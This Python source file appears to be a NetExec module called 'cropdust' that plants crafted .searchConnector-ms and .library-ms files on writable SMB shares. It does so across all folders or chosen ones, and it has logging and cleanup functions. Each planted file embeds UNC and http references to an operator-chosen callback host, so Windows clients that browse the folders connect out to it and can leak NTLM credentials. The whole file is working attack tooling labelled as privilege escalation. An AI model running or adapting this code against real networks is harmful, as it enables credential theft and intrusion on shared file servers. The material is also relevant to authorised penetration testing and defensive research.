import ntpath
import tempfile


class CropDuster:
    def __init__(
        self,
        smb,
        logger,
        filename,
        scfile_path,
        url,
        cleanup,
        type,
        share,
        folders):


        self.smb = smb
        self.host = self.smb.conn.getRemoteHost()
        self.max_connection_attempts = 5
        self.logger = logger
        self.filename = filename
        self.scfile_path = scfile_path
        self.url = url
        self.cleanup = cleanup
        self.type = type
        self.share = share
        self.folders = folders

    
    def log_to_file(self, action, remote_path):
        
        with open("cropdust.log", "a") as f:
            f.write(f"{action} \\\\{self.host}\\{self.share}{remote_path}\n")

    
    def get_dirs(self, share, path="\\"):
        
        results = []
        items = self.smb.conn.listPath(share, path + "*")

        for item in items:
            name = item.get_longname()
            if name in ['.', '..'] or not item.is_directory():
                continue

            dir_path = path + name + "\\"
            results.append(dir_path)
            try:
                results.extend(self.get_dirs(share, dir_path))
            except Exception:
                continue

        return results


    def do_cropdust(self):

        all_dirs = []
        # if all folders on the share were chosen, get a recursive list of them
        if self.folders == "All":
            self.logger.display(f"Getting all accessible directories in {self.share}")
            all_dirs.append("\\") # always include share base
            all_dirs.extend(self.get_dirs(self.share))
        elif self.folders == "BASE":
            dir_path = "\\"
            all_dirs.append(dir_path)
        # otherwise, just set the all_dirs list to self.folders
        else:
            dir_path = f"{self.folders}\\"
            all_dirs.append(dir_path)

        for dir in all_dirs:
            self.logger.debug(f"Dir: {dir}")
            for local_path in self.scfile_path:
                file_name = ntpath.basename(local_path)
                remote_path = ntpath.join(dir, file_name)
                self.logger.display(f'{remote_path}')
                try:
                    if self.cleanup:
                        self.smb.conn.deleteFile(self.share, remote_path)
                        self.logger.success(f"Cleaned: {self.share}{remote_path}")
                        self.log_to_file("CLEAN", remote_path)
                    else:
                        with open(local_path, "rb") as scfile:
                            self.smb.conn.putFile(self.share, remote_path, scfile.read)
                            self.logger.success(f"Dropped: {self.share}{remote_path}")
                            self.log_to_file("DROP", remote_path)
                except Exception as e:
                    if "0xc0000022 - STATUS_ACCESS_DENIED" in str(e):
                        self.logger.fail(f"{dir} not writable, skipping")
                    elif "0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                        self.logger.fail(f"{file_name} not found in {dir}, skipping")
                    else:
                        self.logger.fail(f"Error in {dir}: {e}")


class NXCModule:

    name = "cropdust"
    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a log and cleanup function"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.PRIVILEGE_ESCALATION


    def options(self, context, module_options):
        """
        Recursively drop a .searchConnector-ms/.library-ms file into folders on writable shares.

        SHARE               Specify a share to target
        URL                 URL in the dropped file to call back to, format is {HOST}@{PORT}
        FOLDER              Specify a specific folder to write to - default is recursive
        FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
        TYPE                Specify type of file to drop (search/library/both) - default is "search"
        CLEANUP             Clean up dropped files - default is False
        """
        
        # cleanup
        self.cleanup = False
        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        # url to point to in the dropped file
        self.url = None
        if "URL" in module_options:
            self.url = str(module_options["URL"])
        else:
            context.log.fail("URL is required")
            quit()
        
        # the name of the file
        self.filename = "Documents"
        if "FILENAME" in module_options:
            self.filename = str(module_options["FILENAME"])

        # chosen share
        self.share = None
        if "SHARE" in module_options:
            self.share = str(module_options["SHARE"])
        else:
            context.log.fail("SHARE name is required")
            quit()
            
        # chosen folder
        self.folders = "All"
        if "FOLDER" in module_options:
            self.folders = str(module_options["FOLDER"])
        
        # type
        self.scfile_path = []
        self.type = "search"
        if "TYPE" in module_options:
            self.type = str(module_options["TYPE"])

        if self.type in ("search", "both"):
            path = f"{self.filename}.searchConnector-ms"
            if not self.cleanup:
                path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
                with open(path, "w") as scfile:
                    scfile.truncate(0)
                    modded_url = self.url.split("@")[0]
                    modded_port = self.url.split("@")[1]
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>\n')
                    scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">\n')
                    scfile.write("\t<description>Microsoft Outlook</description>\n")
                    scfile.write("\t<isSearchOnlyItem>false</isSearchOnlyItem>\n")
                    scfile.write("\t<includeInStartMenuScope>true</includeInStartMenuScope>\n")
                    scfile.write(f"\t<iconReference>\\\\{self.url}\\searchOutlookRef.ico</iconReference>\n")
                    scfile.write(f"\t<imageLink>\n\t\t<url>http://{modded_url}:{modded_port}/files/images/SearchOutlook.jpg</url>\n\t</imageLink>\n")
                    scfile.write("\t<templateInfo>\n")
                    scfile.write("\t\t<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>\n")
                    scfile.write("\t</templateInfo>\n")
                    scfile.write("\t<simpleLocation>\n")
                    scfile.write(f"\t\t<url>http://{modded_url}:{modded_port}/files/icons/SearchOutlook.ico</url>\n")
                    scfile.write("\t</simpleLocation>\n")
                    scfile.write("</searchConnectorDescription>\n")                                    
            self.scfile_path.append(path)

        if self.type in ("library", "both"):
            path = f"{self.filename}.library-ms"
            if not self.cleanup:
                path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
                with open(path, "w") as scfile:
                    scfile.truncate(0)
                    modded_url = self.url.split("@")[0]
                    modded_port = self.url.split("@")[1]
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>\n')
                    scfile.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n')
                    scfile.write("\t<name>@windows.storage.dll,-34582</name>\n")
                    scfile.write("\t<version>6</version>\n")
                    scfile.write("\t<isLibraryPinned>true</isLibraryPinned>\n")
                    scfile.write(f"\t<iconReference>\\\\{self.url}\\libOutlookRef.ico</iconReference>\n")
                    scfile.write("\t<templateInfo>\n")
                    scfile.write("\t\t<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n")
                    scfile.write("\t</templateInfo>\n")
                    scfile.write("\t<searchConnectorDescriptionList>\n")
                    scfile.write("\t\t<searchConnectorDescription>\n")
                    scfile.write("\t\t\t<isDefaultSaveLocation>true</isDefaultSaveLocation>\n")
                    scfile.write("\t\t\t<isSupported>false</isSupported>\n")
                    scfile.write(f"\t\t\t<imageLink>\n\t\t\t\t<url>http://{modded_url}:{modded_port}/files/images/libOutlook.jpg</url>\n\t\t\t</imageLink>\n")
                    scfile.write("\t\t\t<simpleLocation>\n")
                    scfile.write(f"\t\t\t\t<url>http://{modded_url}:{modded_port}/files/icons/libOutlook.ico</url>\n")
                    scfile.write("\t\t\t</simpleLocation>\n")
                    scfile.write("\t\t</searchConnectorDescription>\n")
                    scfile.write("\t</searchConnectorDescriptionList>\n")
                    scfile.write("</libraryDescription>\n")
            self.scfile_path.append(path)


    def on_login(self, context, connection):

        context.log.display("Started cropduster module with the following options:")
        context.log.display(f"URL:      {self.url}")
        context.log.display(f"FILENAME: {self.filename}")
        context.log.display(f"SHARE:    {self.share}")
        context.log.display(f"FOLDER:   {self.folders}")
        context.log.display(f"TYPE:     {self.type}")
        context.log.display(f"CLEANUP:  {self.cleanup}")


        cropdust = CropDuster(
            connection,
            context.log,
            self.filename,
            self.scfile_path,
            self.url,
            self.cleanup,
            self.type,
            self.share,
            self.folders)

        cropdust.do_cropdust()
